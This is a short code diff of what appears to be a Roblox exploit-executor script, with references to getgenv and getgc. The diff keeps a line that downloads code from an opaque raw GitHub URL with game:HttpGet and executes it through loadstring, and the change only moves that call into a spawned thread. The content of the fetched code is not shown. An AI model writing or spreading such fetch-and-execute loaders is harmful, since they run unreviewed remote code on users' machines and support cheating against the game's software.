@@ -35,7 +35,9 @@ local previousHashes = {
     --
     
 }
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/PayPal/master/reeeeeeee", true))()
+spawn(function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/PayPal/master/reeeeeeee", true))()
+end)
 
 getgenv().utils = {
     ["getgc"] = getgc,
